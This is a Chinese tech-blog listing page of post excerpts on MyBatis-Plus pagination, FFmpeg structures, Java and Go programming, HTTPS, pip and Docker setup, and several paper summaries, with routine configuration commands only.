		mybatis-plus 3.5分页插件配置 前提 1.项目不是springboot, 是以前的常规spring项目
2.mp 从3.2升级到3.5，升级后发现原本的分页竟然不起作用了，每次查询都是查出所有
前后配置对比 jar包对比
jsqlparser我这里单独引了包，因为版本太低不能使用吗，这个依赖直接删除了，因为mp中本身自己就有这个jar包
以前的配置
现在的配置
官网介绍 官网地址 https://baomidou.com/pages/2976a3/#spring
&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;!-- 其他属性 略 --&gt; &lt;property name="configuration" ref="configuration"/&gt; &lt;property name="plugins"&gt; &lt;array&gt; &lt;ref bean="mybatisPlusInterceptor"/&gt; &lt;/array&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id="mybatisPlusInterceptor" class="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="interceptors"&gt; &lt;list&gt; &lt;ref bean="paginationInnerInterceptor"/&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id="paginationInnerInterceptor" class="com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor"&gt; &lt;!-- 对于单一数据库类型来说,都建议配置该值,避免每次分页都去抓取数据库类型 --&gt; &lt;constructor-arg name="dbType" value="H2"/&gt; &lt;/bean&gt; 可以看到解决的方案就是增加了PaginationInnerInterceptor，然后增加dbtype
springboot 配置 @Configuration @MapperScan("scan.your.mapper.package") public class MybatisPlusConfig { /** * 添加分页插件 */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b5217fd2f8d47cba1acff7b72ece173/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01f1dbf7cdb18ce3592d0a879eb2058d/" rel="bookmark">
			FFMPEG结构体分析：AVCodec
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AVCodec是存储编解码器信息的结构体
每一个编解码器对应一个该结构体【AVCodec】，查看一下ffmpeg的源代码，我们可以看一下H.264解码器的结构体如下所示（h264.c）：
H.264解码器的结构体 AVCodec ff_h264_decoder = { .name = "h264", .type = AVMEDIA_TYPE_VIDEO, .id = CODEC_ID_H264, //wgj 注意：此处其他类型的解码器的值也不同 .priv_data_size = sizeof(H264Context), .init = ff_h264_decode_init, .close = ff_h264_decode_end, .decode = decode_frame, .capabilities = /*CODEC_CAP_DRAW_HORIZ_BAND |*/ CODEC_CAP_DR1 | CODEC_CAP_DELAY | CODEC_CAP_SLICE_THREADS | CODEC_CAP_FRAME_THREADS, .flush= flush_dpb, .long_name = NULL_IF_CONFIG_SMALL("H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10"), .init_thread_copy = ONLY_IF_THREADS_ENABLED(decode_init_thread_copy), .update_thread_context = ONLY_IF_THREADS_ENABLED(decode_update_thread_context), .profiles = NULL_IF_CONFIG_SMALL(profiles), .priv_class = &amp;h264_class, }; JPEG2000解码器结构体（j2kdec.c） AVCodec ff_jpeg2000_decoder = { .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01f1dbf7cdb18ce3592d0a879eb2058d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c931a8d57691b4ec8f9f248929c63874/" rel="bookmark">
			为什么JAVA_HOME修改后Java版本不变
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天的实验需要对java project进行降版本后重构。于是去Oracle官网下载了jdk1.7。然后将系统环境变量JAVA_HOME改成了安装后的jdk1.7路径。即
C:\Program Files\Java\jdk1.7.0_80 系统变量Path中直接引用了%JAVA_HOME%\bin。
但是当我查看版本，却出现了javac改了过来而java没改过来的状况，如下图所示
反复筛查是否还有其他设置jdk版本的地方，确定没有。问了gpt4后，得知使用where.exe这一命令可以查看OS是去哪里找的java.exe和javac.exe
于是
可以看到，新的java.exe被放在了第二排，也就是OS根据Path指定的路径找java.exe，找到第一个以后就不再继续下去了。
解决办法也很直接，将Path变量中后一行的路径移动到前一行的前面。
现在powershell打印出来java和javac版本一致了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb688b771e25935a31cef18cd59d4d08/" rel="bookmark">
			一文掌握 Golang 中的类型断言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是类型断言
类型断言的基本语法
类型断言示例
类型断言原理
类型断言的使用场景
深入理解类型断言
类型断言的最佳实践
小结
类型断言是 Golang 中的一个非常重要的特性，使用类型断言可以判断一个接口的实际类型是否是预期的类型，以便进行对应的处理。本文将对 Golang 的类型断言进行详细的讲解。
什么是类型断言 Golang 中的接口是一种抽象类型，可以存储任何实现了该接口方法的类型实例。然而，由于接口本身不包含类型信息，需要通过类型断言来将接口变量转换为实际类型。
类型断言的基本语法 类型断言的基本语法如下：
value, ok := x.(T) x 是一个接口类型的变量，T 是希望断言的类型。value 将会是 x 转换为类型 T 后的值，ok 是一个布尔值，当类型断言成功时为 true，失败时为 false 。如果不关心断言是否成功，也可以只写成如下形式：
value := x.(T) 但如果断言失败，这种写法会引发 panic。在进行类型断言时，需要注意其安全性。如果不确定 x 的实际类型是否为 T 时，最好使用安全的类型断言，即同时返回一个转换是否成功的布尔值，避免在类型断言失败时导致程序崩溃。
类型断言的必要条件是 x 必须是接口类型，非接口类型的 x 不能做类型断言。此外，T可以是非接口类型，如果想断言成功，则 T 应该实现 x 的接口。T 也可以是接口，则 x 的动态类型也应该实现接口 T。
类型断言示例 接下来通过一些代码示例来理解类型断言的使用方式，示例代码如下：
package main import "fmt" func main() { var i interface{} = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb688b771e25935a31cef18cd59d4d08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/615ea69bfd4c6d16a9d5fa36120ab133/" rel="bookmark">
			【Java面试题】HTTPS的加密流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 客户端发起 HTTPS 请求
客户端在浏览器输入一个HTTPS 网址，并连接服务器的 443 端口。
2. 服务器发送证书给客户端
由于服务器事先会向 ca 申请证书，当收到客户端的 HTTPS 请求后，服务器会将申请到的证书发给客户端。 证书包含的内容有：证书颁发机构的信息，服务器网址的信息，被加密过的服务器公钥，还有经过机构私钥签名之后的数字签名。
3. 客户端解析证书 客户端收到数字证书之后，会验证证书的合法性，如果证书验证通过， 就会生成一个随机的对称密钥，用证书的公钥加密。
4. 客户端发送密钥信息给服务器
客户端将公钥加密后的密钥发送给服务器。
5. 服务器解析得到密钥信息
服务器接收到客户端发来的密文密钥之后，用自己之前保留的私钥对其进行非对称解密 ，解密之后就得到客户端的密钥，然后用客户端密钥对返回数据进行对称加密，这样传输的数据都是密文。
6. 服务器发送加密信息
服务器将加密的密文返回给客户端。
7.客户端解析加密信息
客户端收到后，用自己的密钥对其进行对称解密，得到服务器返回的数据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c483742930d4e658188e576ddd5b566/" rel="bookmark">
			java StringBuilder对比String的优点和15个经典案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 区别：1. 字符串拼接2. 构建动态查询语句3. 格式化输出4. 字符串反转5. 插入字符串6. 删除子串7. 字符串替换8. 构建复杂JSON或XML结构9. 处理用户输入的大量数据10. 动态生成HTML页面11. 处理字符串格式转换12. 实现字符串缓冲区13. 拼接大量字符串数组元素14. 计算字符串长度限制内的文本15. 动态生成SQL IN子句 Java中的 StringBuilder类和 String类在处理字符串时有显著的区别，主要体现在可变性、性能以及线程安全性等方面： 区别： 可变性：
String：是不可变的。每次对String对象进行拼接、替换等操作时，都会创建一个新的String对象，原始对象保持不变。StringBuilder：是可变的。它提供了append()、insert()、delete()等方法，可以直接修改对象内部的字符数组，不需要每次都创建新的对象。 性能：
String：由于其不可变性，在大量字符串操作（尤其是连接）时，会产生较多临时对象，消耗内存且影响性能。StringBuilder：对于频繁的字符串修改操作，性能更优，因为它重用已分配的内存空间，减少垃圾回收压力。 线程安全：
String：本身的操作不是线程安全的，但由于不可变性，一旦创建后，多个线程读取不会产生问题。StringBuilder：在单线程环境下效率更高，因为没有同步开销；而在多线程环境下，如果需要并发修改，应该使用StringBuffer，它是线程安全版本的StringBuilder。 使用StringBuilder的优点案例：
以下是一些使用StringBuilder的优势场景及其示例代码：
1. 字符串拼接 StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; 10000; i++) { sb.append("Value: ").append(i).append("\n"); } String result = sb.toString(); // 最终结果是一个包含大量拼接内容的字符串 在循环中多次拼接字符串时，使用StringBuilder可以避免大量的中间String对象生成。
2. 构建动态查询语句 StringBuilder sql = new StringBuilder("SELECT * FROM Users WHERE "); if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c483742930d4e658188e576ddd5b566/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bca1858683c0ba213123f59a9f48320/" rel="bookmark">
			linux升级pip版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		进入python的安装路径，我这里安装在/opt/python3/在bin目录下执行
python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple
[root@localhost bin]# python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 升级pip /opt/python3/bin/python3.8 -m pip install --upgrade pip [root@localhost bin]# /opt/python3/bin/python3.8 -m pip install --upgrade pip 查看是否升级成功 pip3 -V
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06086678525313ea488bd00dfef23ec9/" rel="bookmark">
			NLP论文阅读记录 - 2021 | RefSum：重构神经总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言0、论文摘要一、Introduction1.1目标问题1.2相关的尝试1.3本文贡献 二.前提堆叠重新排序 三.本文方法3.1 总结为两阶段学习3.1.1 基础系统3.1.2 元系统 3.2 重构文本摘要3.2.1 重构3.2.2 预训练重构3.2.3 微调重构3.2.4 应用场景3.2.4.1 重构为基础学习者3.2.4.2 重构为元学习者 四 实验效果4.1数据集4.2 对比模型4.3实施细节4.4评估指标4.5 实验结果4.5.1 Exp-I：单一系统重排序4.5.2 Exp-II：多系统堆叠汇总级4.5.3 Exp-III：19 个最佳性能系统的概括4.5.4 Exp-IV：在更流行的数据集上的有效性4.6 细粒度分析 五 总结思考 前言 RefSum: Refactoring Neural Summarization（2104） code
paper
0、论文摘要 尽管最近的一些作品显示了不同最先进系统之间潜在的互补性，但很少有作品尝试研究文本摘要中的这个问题。其他领域的研究人员通常会参考重新排序或堆叠技术来解决这个问题。
在这项工作中，我们强调了以前方法的一些局限性，这促使我们提出一个新的框架 Refactor，它提供了文本摘要和摘要组合的统一视图。
在实验上，我们进行了涉及 22 个基础系统、4 个数据集和 3 个不同应用场景的综合评估。
除了 CNN/DailyMail 数据集 (46.18 ROUGE-1) 上的最新结果之外，我们还详细阐述了我们提出的方法如何解决传统方法的局限性，以及 Refactor 模型的有效性揭示了性能洞察改进。
我们的系统可以直接被其他研究人员用作现成的工具，以实现进一步的性能改进。
一、Introduction 1.1目标问题 在神经文本摘要中，系统设计者通常在模型架构（Rush et al., 2015; Kedzie et al., 2018）、解码策略（Paulus et al., 2018）（例如波束搜索）等方面有灵活的选择。结果，即使在相同的数据集上，这些选择的不同选择偏差也会导致不同的系统输出（Kedzie et al., 2018；Hossain et al.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06086678525313ea488bd00dfef23ec9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/032ec34e896930c24543ec5904d77bab/" rel="bookmark">
			【计算机图形学】PARIS: Part-level Reconstruction and Motion Analysis for Articulated Objects
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 之前的方法存在什么问题？这篇论文做了件什么事？2. Previous Work可移动部件的分割和分析用于铰接物体重建的一些隐式表达 3. 问题描述4. 方法复合神经辐射场loss 5. 实验实验数据集Baseline评估指标实验结果 6. 总结LimitationConclusion 7. 其他补充四元数NeRFNeRF原理Positional Encoding in NeRFNeRF网络结构NeRF中的Volume RenderingNeRF中的Hierarchical Sampling分层采样 PSNR，SSIM 1. 之前的方法存在什么问题？这篇论文做了件什么事？ 作者认为之前的铰接物体重建存在两个问题：
问题1：之前做铰接物体重建和理解的方法大多是supervised的，supervised众所周知的缺点就是需要大量的数据来进行学习，这些数据的搜集和整理是费时费力的。
问题2：之前大部分的铰接物体重建都是在已知类别上进行重建的，不同类别的物体会有不同的模型进行拟合，这就导致不同类别的物体需要使用不同类别的数据进行训练。我们更希望得到一个跨类别可用的网络。之前CVPR2022的论文Ditto就是一个跨类别的网络，但是Ditto的缺陷在于难以泛化到没有见过的物体类别，同时没有进行外观的重建。
论文为了解决问题1，便想要通过紧密联系的几何和运动结构来避免显式的3D数据和运动参数的监督。作者认为，了解完整的几何有利于运动参数的预测；反之，了解物体在不同状态下具体的运动参数会给几何的重建提供更好的信号。
论文针对解决问题2，想要提出的方法是通过一个模型，对动态和静态的part进行重建，并进行运动参数的预测。part的表示使用neural fields来进行表示，并通过预测出来的运动参数将分离的（static part &amp; motion part）neural fields连接在一起。
本文的输入输出如下：
输入：两组静态铰接状态下的铰接物体多视角图像
输出：分解出可移动部件、重建几何和外观、进行运动参数预测
特点：PARIS设计了一种自监督的（无需任何3D监督、运动及语义上的注释）、端到端的架构，在part-level上学习shape和appearance并优化运动参数
2. Previous Work 可移动部件的分割和分析 随着铰接物体有了越来越丰富的3D数据和注释，大部分工作喜欢通过一种数据驱动的方式来进行部件运动性求解：
ScrewNet通过递归神经网络处理一组深度图以获得部件运动性
胡老师等人的工作则是通过度量学习，将点云映射到一类运动序列上来估计部件运动型
目前已有的一些3D数据分割的工作无法直接用在运动分割上，针对于这个gap，还有一些工作尝试去做运动部件分割和分析：
Shape2Motion和Li等人的工作以监督的方式学习了category-level的运动部件分割
但是category-level的方法终究有其限制
进一步有人尝试跨类别的方法：
闫博的工作，以及Abdul-Rashid等人设计了跨类别的网络，对点云进行部件分割，进行运动层次预测
耿欣师兄等人的工作通过半监督的方式，从过分割的3D扫描中学习了部件运动参数的预测
Chu等人提出了方法，使得铰接物体可以变化成用户指令所期待的那样
上述的所有工作都是在理解3D点云的铰接和结构。本篇论文的输入是两组RGB图像，比较类似的工作是CVPR 2022的Ditto和CVPR 2023的CARTO。但本篇论文的方法与Ditto和CARTO又有以下不同：
Ditto的输入是交互前后的3D点云，CARTO是双目图像，本篇论文是一组多视角的RGB图像Ditto和CARTO都只focus geometry的建立，都没有注重对于外观的表达，本篇论文在保有geometry的基础上还进行了外观的表达Ditto和CARTO在训练过程中都需要使用到3D监督和铰接注释，本篇论文无需任何监督和注释 用于铰接物体重建的一些隐式表达 隐式表达凭借其连续及拓扑自由的方式变得很火。
较早的工作在铰接物体重建上的代表性工作是NASA和A-SDF，NASA是针对于人体铰接的重建，A-SDF是针对于物体铰接的重建，他们都需要使用3D监督来实现。
随着可微渲染技术的进展，可以从多视角的RGB图像中进一步学习物体的shape和appearance，这驱动了静态场景、刚性可移动部件、动态变化场景的重建。
针对于能够对appearance进行学习的情况，Fangyin Wei等人提出一个category-level的方法来表示铰接物体的shape和appearance，这篇工作主要是利用了articulation latent code、shape latent code和appearance latent code来进行表达，网络可以生成没有见过的articulation states通过在latent space中做内插或者外插。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/032ec34e896930c24543ec5904d77bab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2b6f8c8dc6558bb2772e5b18700b3b7/" rel="bookmark">
			DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality
这个错误信息告诉你，你正在使用的Python 2.7版本已经不再被维护，并且pip 21.0将在2021年1月停止支持Python 2.7。Python 2.7已于2020年1月1日达到其生命周期的终点。
为了解决这个问题，你应该升级你的Python版本。Python 3是当前的主流版本，它提供了许多改进和新特性。你可以从Python的官方网站下载并安装最新版本的Python。
另外，为了确保你的pip也是最新的，你可以使用以下命令升级pip：
bash复制代码
python -m pip install --upgrade pip 但是，请注意，这个命令可能不会在Python 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2b6f8c8dc6558bb2772e5b18700b3b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9cbd5882712c70d0a105e9e8545dd74/" rel="bookmark">
			Linux下Docker Engine安装后的一些配置步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一些安装后的配置令Linux主机可以更好地与Docker配合使用。
0x01 以非root用户身份管理Docker Docker守护进程绑定到Unix套接字，而不是TCP端口。默认情况下,root用户拥有Unix套接字，而其他用户只能使用 sudo. Docker守护进程始终以root用户身份运行。
如果不想在docker命令前加上sudo，那么创建一个名为docker的Unix组，并在其中添加用户。当Docker守护进程启动时， 创建一个可由docker组的成员访问的Unix套接字。在某些Linux上 发行版上，系统会在使用包管理器安装 Docker Engine时自动创建此组，如果是那样的话，就没有必要手动创建组了。
警告
docker组向用户赋予root级别权限。有关这些如何影响系统安全性的详细信息，请参考 Docker守护进程安全资料。
注意
要在没有root权限的情况下运行Docker，请参考以非root用户身份运行Docker守护进程（Rootless模式）。
要创建docker组并添加你的用户，请执行以下操作：
创建docker组。 $ sudo groupadd docker 将您的用户添加到docker组。 $ sudo usermod -aG docker $USER 注销并重新登录，以便重赋予你的组成员身份。
如果在虚拟机中运行Linux，则可能需要重新启动虚拟机以使更改生效。
也可以运行以下命令来激活对组的更改： $ newgrp docker 验证您是否可以在没有sudo的情况下运行docker命令。 $ docker run hello-world 这个命令下载一个测试映像并在容器中运行它。当容器运行时，它会打印一条消息并退出。
如果在添加用户到docker组之前此用户使用sudo运行过Docker CLI命令，可能会看到以下错误：
WARNING: Error loading config file: /home/user/.docker/config.json - stat /home/user/.docker/config.json: permission denied 此错误表示~/.docker/的权限设置目录不正确，因为之前使用了sudo命令。
要解决此问题，请删除~/.docker/目录（它会自动重新创建，但任何自定义设置都将丢失），或更改其所有权限， 使用以下命令设置权限：
$ sudo chown "$USER":"$USER" /home/"$USER"/.docker -R $ sudo chmod g+rwx "$HOME/.docker" -R 0x02 使用systemd将Docker配置为开机自启动 许多现代Linux发行版都使用 systemd来管理系统引导时启动哪些服务。在Debian和Ubuntu上，Docker服务默认在系统引导时启动。对于使用systemd的其他Linux发行版，要开机自动启动Docker和containerd， 运行以下命令：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9cbd5882712c70d0a105e9e8545dd74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f67d37d4726795b887b6cf442eaf213/" rel="bookmark">
			科研学习|论文解读——信息行为和社会控制：了解家庭慢性病管理中的冲突信息行为
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要 信息与控制的关系引起了社会科学家的兴趣。然而，许多先前的工作都集中在组织而不是家庭上。交互式信息行为的研究也侧重于组织和协作，而不是冲突。因此，在有慢性疾病的家庭中，我们调查了健康相关社会控制背景下的信息行为以及控制对患者健康行为的影响。我们对38个家庭群体和97个个体进行了为期2年的访谈定性分析。研究结果揭示了信息冲突行为，导致家庭成员和患者之间争夺控制权和影响力。为了应对与患者健康行为相关的问题，家庭成员通过执行规范、利用专业知识、进行监督和构建环境来寻求、共享和使用信息来对患者进行社会控制。这些行为与患者自身信息获取的利益和观点相冲突。患者的反应是评估家属提供的信息，并利用这些信息来抵制或安抚规范的执行，反驳或同意专家意见，允许或阻止监督。随着时间的推移，一些患者的行为发生了变化。或者，患者阻止家人了解自己的信息，或者家人退缩。结果挑战了利益和和谐的假设，而这些假设是许多先前的信息行为研究的特点。
1.引言 慢性病是无法治愈的疾病，需要通过药物治疗和/或改变生活方式进行长期管理。大约60%的美国成年人至少有一种，大约40%的人有两种或更多。慢性病管理通常需要改变日常行为。大多数疾病管理是在家里进行的，并且往往植根于患者的家庭关系中。
家庭成员在控制慢性疾病方面发挥着关键作用。五分之一的美国成年人是帮助生病的朋友或家人的非正式照顾者。患有慢性疾病的人在忠诚的关系中往往比单身的人活得更长。除了这些好处之外，越来越多的研究将与健康相关的社会控制或改变行为的社会压力作为部分解释。与健康相关的社会控制研究侧重于他人为改善患者健康行为(如饮食)和结果(如血糖)所做的努力。
自我照顾和非正式照顾涉及重要的信息工作，包括寻找、管理和使用健康信息。虽然慢性病患者可以独立完成信息工作，但家庭成员可以提供帮助。然而，信息行为在健康相关社会控制中的作用程度尚未得到考虑。以往以政策为导向的情报学研究强调了信息对他人施加控制的潜在用途，这表明信息在与健康相关的社会控制中具有潜在作用。如果信息行为被用于对人际关系施加控制，患者可能并不总是对非正式护理人员的信息寻求、共享和使用做出积极反应；我们在这一领域的试点工作表明了这种可能性。因此，我们问:
RQ1：在慢性病家庭中，信息行为(个人和交互)在与健康相关的社会控制中扮演什么角色(如果有)?RQ2：患者对感知到的涉及信息行为的与健康相关的社会控制有何反应?
我们将健康行为定义为可能影响健康结果的选择和行动。研究表明，信息行为与健康相关的动机、行为和临床结果之间存在关联。然而，其他人的信息行为对患者健康行为的潜在影响却很少受到关注。因此，我们提出以下问题：
RQ3：家庭成员试图利用信息来控制患者的健康行为，如果有的话，是如何影响这些行为的?
疾病的长期性意味着信息行为可能会随着时间的推移而改变，特别是当疾病进展或在急性期和缓解期之间变化时。此外，护理角色和信息需求也会发生变化。因此，时间可能是健康相关社会控制与信息和健康行为之间关系的一个重要方面。 然而，大多数考虑时间的研究都依赖于横断面方法和回顾性报告。因此，我们对以下问题进行了前瞻性研究：
RQ4：社会控制和信息行为之间的关系是如何随时间变化的?
2.文献综述 2.1 健康信息行为 个体信息行为 信息行为是“与信息获取的来源和渠道有关的人类行为的总和”。许多关于信息行为的研究，包括与健康相关的研究，都将其作为一种个体现象进行分析，也就是说，个体为了满足个人需求、理解差距或其他需求而进行的行为目标。
个体信息行为包括信息获取，或通过主动和被动寻求获取新信息，以及偶然的意外信息获取。信息规避，“任何旨在阻止或延迟获取可用但可能不需要的信息的行为”，也可以是一种个人信息行为。信息评估是另一种个体信息行为，是一个“迭代过程”，涉及对信息源的“一个或多个判断”。这些判断包括可信性，信息来源的可信度；准确性，信息的正确性或精确性;以及情境相关性，即信息对“当前情境、任务或问题”的影响程度。信息使用作为一种单独的信息行为在这里被定义为将工具或资源应用于给定信息的过程。
尽管传统医疗机构对慢性病患者很重要，但它们通常不能很好地满足家庭照顾者的个人信息需求。因此，照顾者经常独立地寻找信息。然而，大多数研究都考察了患者个体的行为，而对照顾者的研究相对较少。照顾者通常通过他人的身体体验疾病，并且无法获得患者的信息来源，例如医疗保健提供者。这表明有必要了解他们特定的个人信息行为。
交互信息行为 越来越多的文献探讨了涉及互动的信息行为，在这种互动中，两个或更多的人相互交流或作出反应。一些先前描述的信息行为本身就是互动的；例如，信息共享被定义为交流已经获得的信息。值得注意的是，信息共享在家庭照顾者中可能很常见，因为在所有与健康相关的互联网搜索中，有一半是代表他人进行的。此外，家庭照顾者还可以分享已获得的信息，从而帮助他人克服信息搜寻方面的障碍。
人们很少认识到的一个事实是，家庭成员的信息行为可能会相互冲突，比如一方获得了有关疾病的信息，而另一方却规避了。与疾病相关的压力和照顾也可能是家庭冲突的一般来源，与疾病相关的信息行为可能被更广泛的家庭冲突或家庭成员之间的积极反对所背景化。为了更充分地表征互动信息行为，重要的是在潜在冲突的背景下检查家庭信息行为，例如当健康相关的社会控制发生时。
2.2 信息和行为变化 对于许多慢性病，健康结果与健康行为有关；因此，鼓励积极的行为改变很重要。信息行为与各种健康行为改变模型有关。然而，人们对交互式信息行为的关注却很少。考虑社会影响通过说服、示范和规范产生的影响，以及社会关系的其他贡献，如通过社会网络提供的与健康相关的信息（已被确定为通过社会资本提供的资源），这一差距是至关重要的。社会资本与自我评价健康呈正相关。然而，人们对互动信息行为对个体健康行为的潜在影响知之甚少。本文通过考虑家庭信息行为在患者健康行为中的作用来解决这一差距。
健康信息并不总是与积极的结果相关联。存在发现错误信息的风险。有些人故意回避有压力的信息。在早期的工作中，我们发现家庭信息共享会导致人际关系紧张。因此，了解健康信息行为在家庭中的潜在负面影响是很重要的。
2.3 信息、权力和控制 信息、权力和控制之间的关系一直是社会科学和组织理论的研究热点。权力被定义为存在于社会生活各个层面的一种生产关系。控制与一种形式联系在一起，即纪律，它通过组织空间、时间和行为来规范行为。纪律是在机构(医院、学校等)和人际关系层面上实施的。信息通过(a)专业知识、(b)执行规范、(c)监督和(d)获取信息，与权力和控制相关联。
信息通过指导社会可接受行为的规范产生权力。“社会控制”与社会规范联系在一起，从而减少了胁迫的必要性。规范内化为感知、信念和动机，引导个人按照行为理想行事。感知规范源于有关他人行为和他人希望我们做什么的信息。
人们越来越重视通过专业知识来表达权力，这种权力可以通过规范行为的纪律来表达。专业知识，或专业知识，通过权威（一种被他人接受的行动权力）使对他人的控制合法化。与专业知识相关的权威在基于角色的互动(例如，医生对病人)和机构行为中发挥作用。病人可能会试图通过表现自己对健康知识渊博来获得医疗权威。专业知识和权威允许个人对组织、机构、系统以及其他个人施加控制。
监督研究在概念上要归功于福柯（1977 年），它认为监督技术无处不在且不断扩展。在永久监督下，即使没有直接观察，行为也会受到控制。在健康方面，20世纪的医学从治疗病人转向监督健康人，并试图在人口层面控制健康。监督医学包括远程病人监督或移动健康应用等旨在促使行为改变的工具。
信息是力量的源泉。组织研究探索了在工作中控制“谁知道什么”的问题。那些通过培训获得信息的人是“有技能的人”，拥有相应的权力和声望。不公平的信息获取方式强化了社会特权。然而，权力较小的人可能会利用信息来加强或保持自己的地位。在工作场所，地位较低的员工通过控制有关组织程序、政策和规范的信息来获得权力。
信息、权力和社会控制是相互联系的，但目前还没有针对它们在人际关系中的作用进行全面的探讨。因此，本文分析了信息行为与健康相关社会控制之间的关系。
2.4 健康相关的控制 社会控制，即试图影响和调节他人的行为，在社会关系中很常见。与健康相关的社会控制会促使人们做出与积极健康结果相关的行为。与健康相关的社会控制可能是胁迫性的（即唠叨和内疚），也可能是说服性的，发生在多种类型的关系中，包括伙伴关系。在承诺关系中的伴侣双方都会发起并接受以促进健康为导向的交流，包括社会控制。拥有密集家庭网络的患者也有可能在获得情感支持和实际帮助的同时体验到社会控制。与健康相关的社会控制与患者行为的改变和健康结果的改善息息相关，但也可能产生意想不到的负面情绪影响或引发抵触情绪，从而强化负面行为。
迄今为止，与健康相关的社会控制研究主要集中于记录社会控制的策略和效果，很少关注信息行为的作用。
3.方法 3.1 概述 这项为期2年的纵向研究包括患有糖尿病或艾滋病的家庭，所选病症代表了慢性病经历的差异(例如：传染性，治疗类型，污名化程度)。数据收集时间为2010年冬至2013年冬。密歇根大学机构审查委员会批准了该项研究。
3.2 招募 被诊断出患有2型糖尿病或艾滋病并愿意招募家庭成员参与其护理的患者。患者通过三家特定疾病非政府组织的传单和/或通讯录以及一所大学的研究招募网站上发布招募信息进行招募的。参与者可根据自己的意愿定义家庭，包括伴侣、父母、成年子女、兄弟姐妹、姑姑、舅舅、表兄弟姐妹和亲密朋友。 参与者在每次访谈时都会收到一张 20 美元的礼品卡。
3.3 数据收集 共5次访谈接触，个别访谈发生在第1次和第5次。在第2、3和4次进行小组访谈，并在第4次进行选择性家庭参观(图1)。根据“家庭案例法”，对每个家庭成员进行了深入的半结构化访谈；这允许参与者在家庭环境中进行可能不愿意进行的讨论。家庭小组访谈是一种改良的焦点小组，只涉及彼此认识的人。访谈集中于日常疾病管理、信息行为、家庭关系和互动；在参与者选择的地点进行；持续时间为90分钟至2小时；录音并逐字记录。受访者在每次接触时都填写了人口调查表。
3.4 数据分析 使用 NVivo 软件对访谈记录进行了多阶段分析
4.结果 4.1 参与者特征 如表1所示，在时间1时招募了38个家庭共97个人。到时间5时，61%的家庭(n=23)保留下来，占被招募个体(n = 66)的68%。大约60%参与者是白人，30%是非裔美国人。性别大致平衡。
所有家庭都在至少一次访谈中提到与健康相关的社会控制行为。在多次访谈的家庭(n=29)中，86%的家庭(n=25)在两次或两次以上访谈中提到社会控制。最常见的形式是强迫(告诉病人该做什么;表2)，有64%的人提到。其他常见行为包括质疑病人行为、构建环境和提出关注。内疚和反复强调观点是最不常被讨论的。表2将每种行为映射到信息和控制方法上。冲突信息行为反映了实施社会控制和影响的努力以及适应或抵制这些努力的尝试。
4.2 问题1：在慢性病家庭中，信息行为（个人或交互）在与健康相关的社会控制中扮演什么角色（如果有的话）？ 4.2.1 获取信息和确定问题 Family members
	</div>
